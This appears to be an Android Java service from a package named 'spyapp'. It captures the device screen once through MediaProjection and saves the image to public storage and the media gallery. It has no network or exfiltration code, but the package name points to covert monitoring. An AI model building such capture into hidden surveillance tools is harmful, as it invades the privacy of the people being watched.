package kkactive_india.in.spyapp;

import android.Manifest;
import android.app.Activity;
import android.app.Dialog;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.graphics.Point;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.MediaStore;
import android.support.annotation.Nullable;
import android.support.annotation.RequiresApi;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.OrientationEventListener;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.ImageButton;
import android.widget.Toast;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.Date;
import java.util.Objects;

import static android.content.ContentValues.TAG;
import static java.security.AccessController.getContext;


public class ScreenShot extends Service {

    private static final int REQUEST_CODE = 100;

    public static MediaProjectionManager mProjectionManager;

    public static MediaProjection sMediaProjection;
    private static Display mDisplay;
    static int coun = 0;

    private static int mWidth;
    private static int mHeight;
    private static int mRotation;

    private static int mDensity;


    private static ImageReader mImageReader;

    private static VirtualDisplay mVirtualDisplay;
    private static final String SCREENCAP_NAME = "screencap";
    static File STORE_DIRECTORY = new File(Environment.getExternalStoragePublicDirectory(
            Environment.DIRECTORY_PICTURES), "ScreenShot");

    //private MediaProjectionManager mediaProjectionManager;
    // private MediaProjection mediaProjection;
    private static Intent screenshotPermission = null;


    private static final int VIRTUAL_DISPLAY_FLAGS = DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY | DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC;

    private static Handler mHandler;

    static Context context;


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

  /*  @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    protected void getScreenshotPermission() {
        try {
            if (hasScreenshotPermission()) {
                if(null != sMediaProjection) {
                    sMediaProjection.stop();
                    sMediaProjection = null;
                }
                sMediaProjection = mProjectionManager.getMediaProjection(Activity.RESULT_OK, (Intent) screenshotPermission.clone());
            } else {
                openScreenshotPermissionRequester();
            }
        } catch (final RuntimeException ignored) {
            openScreenshotPermissionRequester();
        }
    }*/

    private boolean hasScreenshotPermission() {
        int result = getApplicationContext().checkCallingOrSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        return result == PackageManager.PERMISSION_GRANTED;
    }

    protected void openScreenshotPermissionRequester() {
        final Intent intent = new Intent(this , ScreenPermission.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    protected static void setScreenshotPermission(final Intent permissionIntent) {
        screenshotPermission = permissionIntent;

        /*if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            sMediaProjection = mProjectionManager.getMediaProjection(Activity.RESULT_OK, (Intent) permissionIntent.clone());
        }*/

        Log.e("Media", String.valueOf(sMediaProjection));


        if (sMediaProjection != null) {
            File externalFilesDir = context.getExternalFilesDir(null);
            if (externalFilesDir != null) {
                //STORE_DIRECTORY = new File(getExternalFilesDir(null).getAbsolutePath() + "/youthive/");
                File storeDirectory = new File(String.valueOf(STORE_DIRECTORY));
                if (!storeDirectory.exists()) {
                    boolean success = storeDirectory.mkdirs();
                    if (!success) {
                        Log.e(TAG, "failed to create file storage directory.");
                        //return;
                    }
                }
            } else {
                Log.e(TAG, "failed to create file storage directory, getExternalFilesDir is null.");
                // return;
            }


        }


        DisplayMetrics metrics = context.getResources().getDisplayMetrics();
        mDensity = metrics.densityDpi;
        mDisplay = ((WindowManager) context.getSystemService(WINDOW_SERVICE)).getDefaultDisplay();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            createVirtualDisplay();
        }

        mOrientationChangeCallback = new OrientationChangeCallback(context);
        if (mOrientationChangeCallback.canDetectOrientation()) {
            mOrientationChangeCallback.enable();
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            sMediaProjection.registerCallback(new MediaProjectionStopCallback(), mHandler);
        }

    }

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        Log.e("Media","Called");

        context = this;

        new Thread() {
            @Override
            public void run() {
                Looper.prepare();
                mHandler = new Handler();
                Looper.loop();
            }
        }.start();

        try {
            if (hasScreenshotPermission()) {
                if (null != sMediaProjection) {
                    Log.e("Media", String.valueOf(sMediaProjection));
                    sMediaProjection.stop();
                    sMediaProjection = null;
                }
                else
                {
                    Log.e("Media","null");
                }


                mProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);


                openScreenshotPermissionRequester();

                /*sMediaProjection = mProjectionManager.getMediaProjection(Activity.RESULT_OK, (Intent) screenshotPermission.clone());

                Log.e("Media", String.valueOf(sMediaProjection));*/
            } else {
                openScreenshotPermissionRequester();
            }
        } catch (final RuntimeException ignored) {
            openScreenshotPermissionRequester();
        }

        // String userID = intent.getStringExtra("request");
        // Log.e("RequestCode",userID);
        //  String userdata = intent.getStringExtra("data");
        // sMediaProjection = mProjectionManager.getMediaProjection(Integer.parseInt(userID), intent);


        return super.onStartCommand(intent, flags, startId);
    }


    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    private static void createVirtualDisplay() {

        Point size = new Point();
        mDisplay.getSize(size);
        mWidth = size.x;
        mHeight = size.y;

        mImageReader = ImageReader.newInstance(mWidth, mHeight, PixelFormat.RGBA_8888, 2);
        mVirtualDisplay = sMediaProjection.createVirtualDisplay(SCREENCAP_NAME, mWidth, mHeight, mDensity, VIRTUAL_DISPLAY_FLAGS, mImageReader.getSurface(), null, mHandler);
        mImageReader.setOnImageAvailableListener(new ImageAvailableListener(), mHandler);

    }

    private static int IMAGES_PRODUCED;


    //  private static int IMAGES_PRODUCED;

    private static class ImageAvailableListener implements ImageReader.OnImageAvailableListener {
        @Override
        public void onImageAvailable(ImageReader reader) {
            Image image = null;
            FileOutputStream fos = null;
            Bitmap bitmap = null;

            try {

                Log.d("screenshot", String.valueOf(coun));

                if (coun == 0) {
                    image = reader.acquireLatestImage();
                    if (image != null) {
                        Image.Plane[] planes = image.getPlanes();
                        ByteBuffer buffer = planes[0].getBuffer();
                        int pixelStride = planes[0].getPixelStride();
                        int rowStride = planes[0].getRowStride();
                        int rowPadding = rowStride - pixelStride * mWidth;

                        // create bitmap

                        bitmap = Bitmap.createBitmap(mWidth + rowPadding / pixelStride, mHeight, Bitmap.Config.ARGB_8888);
                        bitmap.copyPixelsFromBuffer(buffer);

                        // write bitmap to a file
                        fos = new FileOutputStream(STORE_DIRECTORY + "/myscreen_" + IMAGES_PRODUCED + ".png");
                        bitmap.compress(Bitmap.CompressFormat.JPEG, 100, fos);

                        IMAGES_PRODUCED++;
                        Log.e(TAG, "captured image: " + IMAGES_PRODUCED);


                        final String path = MediaStore.Images.Media.insertImage(Objects.requireNonNull(context).getContentResolver(), bitmap, "Title", null);

                        Log.e("Media" , path);

                       /* final Dialog dialog = new Dialog(player);
                        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
                        Objects.requireNonNull(dialog.getWindow()).setBackgroundDrawableResource(android.R.color.transparent);
                        dialog.setContentView(R.layout.screenshot_dialog);
                        dialog.setCancelable(false);
                        dialog.show();*/

                        Log.e(TAG, "1");

                        /*RoundedImageView imeg = dialog.findViewById(R.id.imageView5);
                        ImageButton closeDialog = dialog.findViewById(R.id.imageButton8);
                        Button share = dialog.findViewById(R.id.button3);*/

                        Log.e(TAG, "2");

                        //  imeg.setImageURI(Uri.parse(path));

                        Log.e(TAG, "3");

                        /*closeDialog.setOnClickListener(new View.OnClickListener() {
                            @Override
                            public void onClick(View v) {


                                dialog.dismiss();


                            }
                        });*/

                        Log.e(TAG, "4");

                        Log.e(TAG, "5");
                       /* share.setOnClickListener(new View.OnClickListener() {
                            @Override
                            public void onClick(View v) {

                                Intent i = new Intent(Intent.ACTION_SEND);

                                i.setType("image/*");

                                i.putExtra(Intent.EXTRA_STREAM, Uri.parse(path));
                                try {
                                    startActivity(Intent.createChooser(i, "Share Screenshot..."));
                                    dialog.dismiss();
                                } catch (android.content.ActivityNotFoundException ex) {

                                    ex.printStackTrace();
                                }


                            }
                        });*/


                        Log.e(TAG, "6");


                        coun++;


                        stopProjection();

                    }
                }


            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                if (fos != null) {
                    try {
                        fos.close();
                    } catch (IOException ioe) {
                        ioe.printStackTrace();
                    }
                }

                if (bitmap != null) {
                    bitmap.recycle();
                }

                if (image != null) {
                    image.close();
                }
            }
        }
    }

    private static void stopProjection() {
        mHandler.post(new Runnable() {
            @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
            @Override
            public void run() {
                if (sMediaProjection != null) {
                    sMediaProjection.stop();
                }
            }
        });
    }


    private static class OrientationChangeCallback extends OrientationEventListener {

        OrientationChangeCallback(Context context) {
            super(context);
        }

        @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
        @Override
        public void onOrientationChanged(int orientation) {
            final int rotation = mDisplay.getRotation();
            if (rotation != mRotation) {
                mRotation = rotation;
                try {
                    // clean up
                    if (mVirtualDisplay != null) mVirtualDisplay.release();
                    if (mImageReader != null) mImageReader.setOnImageAvailableListener(null, null);

                    // re-create virtual display depending on device width / height
                    createVirtualDisplay();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

    private static OrientationChangeCallback mOrientationChangeCallback;

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    private static class MediaProjectionStopCallback extends MediaProjection.Callback {
        @Override
        public void onStop() {
            Log.e("ScreenCapture", "stopping projection.");
            mHandler.post(new Runnable() {
                @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
                @Override
                public void run() {
                    if (mVirtualDisplay != null) mVirtualDisplay.release();
                    if (mImageReader != null) mImageReader.setOnImageAvailableListener(null, null);
                    if (mOrientationChangeCallback != null) mOrientationChangeCallback.disable();
                    sMediaProjection.unregisterCallback(MediaProjectionStopCallback.this);
                }
            });
        }
    }

/*    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        Intent mainIntent = new Intent(getApplication(), MainActivity.class);
        mainIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(mainIntent);
    }*/
}
